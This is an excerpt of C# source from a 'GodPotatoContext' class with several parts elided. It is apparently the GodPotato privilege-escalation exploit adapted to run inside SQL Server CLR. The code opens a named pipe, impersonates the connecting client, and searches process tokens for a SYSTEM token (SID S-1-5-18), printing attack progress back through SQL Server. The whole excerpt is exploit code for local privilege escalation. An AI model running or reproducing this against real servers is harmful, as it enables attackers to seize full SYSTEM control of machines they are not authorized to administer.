    ...
    public class GodPotatoContext
    {
        ...
        protected void PipeServer()
        {
            ...
            try
            {
                ...
                SqlContext.Pipe.Send("[*] CreateNamedPipe " + serverPipe);
                if (pipeServerHandle != BAD_HANLE)
                {
                    ...
                    {
                        SqlContext.Pipe.Send("[*] Pipe Connected!");
                        if (ImpersonateNamedPipeClient(pipeServerHandle))
                        {
                            ...
                            SqlContext.Pipe.Send("[*] CurrentsImpersonationLevel: " + systemIdentity.ImpersonationLevel);

                            SqlContext.Pipe.Send("[*] Start Search System Token");
                            ...
                            if (systemIdentity.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                            {
                                SharpToken.TokenuUils.ListProcessTokens(-1, processToken => {
                                    if (processToken.SID == "S-1-5-18" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)
                                    {
                                        ...
                                        SqlContext.Pipe.Send(String.Format("[*] PID : {0} Token:0x{1:x}  User: {2} ImpersonationLevel: {3}", processToken.TargetProcessId, processToken.TargetProcessToken, processToken.UserName, processToken.ImpersonationLevel));
                            ...
                            SqlContext.Pipe.Send("[*] Find System Token : " + isFindSystemToken);

                            RevertToSelf();
                        }
                        else
                        {
                            SqlContext.Pipe.Send($"[!] ImpersonateNamedPipeClient fail error:{Marshal.GetLastWin32Error()}");
                        }
                    }
                    else
                    {
                        SqlContext.Pipe.Send("[!] ConnectNamedPipe timeout");
                    }

                }
                else
                {
                    SqlContext.Pipe.Send($"[!] CreateNamedPipe fail error:{Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception e)
            {
            ...
            if (IsStart)
            {
                ...
                if (pipeServerThread.IsAlive)
                {
                    try
                    {
                        ...
                        SafeFileHandle safeHandle = new SafeFileHandle(pipeClientHandle, ownsHandle: false);
